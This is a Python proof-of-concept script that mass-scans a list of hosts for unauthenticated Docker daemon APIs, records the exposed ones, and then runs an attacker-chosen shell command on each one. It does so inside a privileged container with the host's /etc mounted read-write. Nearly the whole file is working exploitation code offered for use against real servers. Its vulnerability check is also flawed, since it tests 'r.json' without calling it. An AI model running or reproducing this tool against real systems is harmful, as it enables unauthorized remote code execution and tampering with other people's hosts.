#!/usr/bin/env python3
#descrption: POC to mass scan for unauthenticated docker daemon apis
# References: https://blog.csdn.net/qq_59350385/article/details/125485446
#author: joelczk

import argparse
import requests
import docker
import os

def cleanup():
    os.system("rm -rf vuln.txt")
    
def check_vulnerable(url):
    url = url + "/containers/json"
    try:
        r = requests.get(url)
        if r.json:
            return True
        else:
            return False
    except:
        return False

def check_vulnerable_urls(file):
    urls = open(file).readlines()
    output_file = open("vuln.txt",'a')
    print("[+] Checking for urls vulnerable to unauthorized docker daemon api")
    for url in urls:
        url = url.strip()
        if check_vulnerable(url) == True:
            output_file.write(url)
            output_file.write('\n')
        else:
            continue
    print("[+] Vulnerable urls saved to vuln.txt")

def execute(command):
     vuln_urls = open('vuln.txt').readlines()
     print("[+] Executing commands for vulnerable docker containers")
     for url in vuln_urls:
         url = url.strip()
         print("[*] Executing commands for {url}".format(url=url))
         try:
             client = docker.DockerClient(base_url=url)
             docker_command = r'''sh -c "{command}"'''.format(command=command)
             data = client.containers.run('ubuntu:latest', docker_command, privileged=True, remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
             print(data.decode())
         except Exception as e:
             print(e)
             print("[!] An error occured in code execution for docker daemon api!")

def main(file, command):
    cleanup()
    check_vulnerable_urls(file)
    execute(command)
    
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--file', help='File of IPs to be checked')
    parser.add_argument('--command', help="Command to execute")
    args = parser.parse_args()
    main(args.file, args.command)
